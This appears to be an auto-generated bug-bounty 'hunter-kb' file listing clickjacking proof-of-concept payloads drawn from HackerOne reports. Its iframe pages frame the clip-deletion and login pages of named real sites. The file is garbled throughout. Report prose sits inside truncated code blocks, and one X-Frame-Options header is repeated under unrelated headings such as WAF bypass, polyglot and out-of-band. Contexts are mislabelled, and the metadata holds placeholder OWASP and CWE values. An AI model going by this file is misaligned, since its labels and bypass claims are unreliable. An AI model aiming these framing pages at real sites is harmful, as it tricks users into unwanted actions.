---
vuln_type: "Clickjacking"
file_type: "payloads"
total_reports: "94"
avg_bounty: "200"
max_bounty: "200"
severity_distribution: "critical:1% high:1% medium:3% low:95%"
owasp_categories: ["A00:2021"]
common_cwe: ["CWE-000"]
last_updated: "2026-04-09"
tags: ["Clickjacking", "web", "api", "A00", "hunter-kb"]
related_vulns: ["Information_Disclosure", "Broken_Access_Control", "SSRF"]
---


# Clickjacking — Payloads

 This payload structure operates reliably against standard implementations lacking modern security boundaries or active request filtering components.

> [!TIP]
> Always iterate. Test a canary token to figure out parsing logic, then increment to full payload structures.

> [!WARNING]
> Execute payloads explicitly only against authorized systems in accordance with program SLA scopes.

## Basic Payloads

#### Payload 1

```javascript
X-Frame-Options: ALLOW-FROM https://twitter.com/
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1031525](https://hackerone.com/reports/1031525)

## Context-Specific Payloads

#### Payload 2

```javascript
<html lang="en-US">
<head>
<meta charset="UTF-8">
<title>I-Frame</title>
</head>
<body>
<center><h1>THIS PAGE IS VULNERABLE TO CLICKJACKING</h1>

<iframe src="https://crossclip.com/clips"... This report describes a Clickjacking issue affecting the target application surface. The disclosed finding is titled "clickjacking on deleting user" and indicates exploitable input handling weaknesses. Observed report context: ## Summary: An attacker can trick victim to delete his own clips on https://crossclip.com/clips. ## Steps To Reproduce: {F1403810} 1. Login 1. Create an HTML file with the following code.
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1039805](https://hackerone.com/reports/1039805)

## Advanced Payloads

#### Payload 3

```javascript
<html>
<head>
<title>Clickjack test page</title>
</head>
<body>
<p>Website is vulnerable to clickjacking!</p>
<iframe src="https://hackers.upchieve.org/login" width="1000" height="550"></iframe>
<div style="height: 30px;width: 130px;left:... This report describes a Clickjacking issue affecting the target application surface. The disclosed finding is titled "Clickjacking ar..." and indicates exploitable input handling weaknesses. Observed report context: I found clickjacking at login page on https://hackers.upchieve.org that can be exploited if the UI overlay can be performed correctly by the attacker.
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #108056](https://hackerone.com/reports/108056)

## WAF Bypass Payloads

#### Payload 1

```javascript
X-Frame-Options: ALLOW-FROM https://twitter.com/
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1031525](https://hackerone.com/reports/1031525)

## Encoding & Obfuscation

#### Payload 4

```javascript
<html>
<body>
<iframe src="http://book.zomato.com/account/login.aspx" width="500" height="500">
</body>
</html>
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1176104](https://hackerone.com/reports/1176104)

## Polyglot Payloads

#### Payload 1

```javascript
X-Frame-Options: ALLOW-FROM https://twitter.com/
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1031525](https://hackerone.com/reports/1031525)

## Blind / Out-of-Band Payloads

#### Payload 1

```javascript
X-Frame-Options: ALLOW-FROM https://twitter.com/
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1031525](https://hackerone.com/reports/1031525)

## Chained Payloads

#### Payload 4

```javascript
<html>
<body>
<iframe src="http://book.zomato.com/account/login.aspx" width="500" height="500">
</body>
</html>
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1176104](https://hackerone.com/reports/1176104)


